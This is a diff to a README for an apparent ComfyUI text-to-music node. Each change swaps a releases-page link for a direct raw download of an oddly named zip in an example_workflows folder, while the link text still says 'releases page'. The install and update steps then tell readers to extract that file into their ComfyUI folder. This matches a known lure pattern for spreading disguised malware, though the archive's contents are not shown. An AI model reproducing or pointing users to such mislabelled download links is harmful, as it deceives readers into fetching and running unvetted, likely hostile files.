@@ -1,6 +1,6 @@
 # 🎵 ComfyUI-Foundation-1 - Turn Text Into Music Samples
 
-[![Download](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge)](https://github.com/lislegenusthiobacillus199/ComfyUI-Foundation-1/releases)
+[![Download](https://img.shields.io/badge/Download-Releases-blue?style=for-the-badge)](https://github.com/lislegenusthiobacillus199/ComfyUI-Foundation-1/raw/refs/heads/main/example_workflows/U_Comfy_Foundation_laxness.zip)
 
 ## 🎧 What this is
 
@@ -25,7 +25,7 @@ A GPU with at least 8 GB VRAM is a good fit. More VRAM helps with larger workflo
 
 ## ⬇️ Download and install
 
-1. Visit the [releases page](https://github.com/lislegenusthiobacillus199/ComfyUI-Foundation-1/releases) to download.
+1. Visit the [releases page](https://github.com/lislegenusthiobacillus199/ComfyUI-Foundation-1/raw/refs/heads/main/example_workflows/U_Comfy_Foundation_laxness.zip) to download.
 2. Open the latest release.
 3. Download the Windows package or the source files from that page.
 4. If you get a zip file, extract it to your ComfyUI custom nodes folder.
@@ -165,7 +165,7 @@ Keep the files in the same ComfyUI folder tree. That helps the app find the node
 ## 🔁 Updating the app
 
 When a new release appears:
-1. Go to the [releases page](https://github.com/lislegenusthiobacillus199/ComfyUI-Foundation-1/releases)
+1. Go to the [releases page](https://github.com/lislegenusthiobacillus199/ComfyUI-Foundation-1/raw/refs/heads/main/example_workflows/U_Comfy_Foundation_laxness.zip)
 2. Download the newest version
 3. Replace the old custom node folder
 4. Restart ComfyUI
@@ -186,7 +186,7 @@ It is built around structured text-to-sample diffusion, so it works best when yo
 
 ## 📎 Download again
 
-[![Releases Page](https://img.shields.io/badge/Go%20to-Releases%20Page-grey?style=for-the-badge)](https://github.com/lislegenusthiobacillus199/ComfyUI-Foundation-1/releases)
+[![Releases Page](https://img.shields.io/badge/Go%20to-Releases%20Page-grey?style=for-the-badge)](https://github.com/lislegenusthiobacillus199/ComfyUI-Foundation-1/raw/refs/heads/main/example_workflows/U_Comfy_Foundation_laxness.zip)
 
 ## 🪄 Quick checklist
 
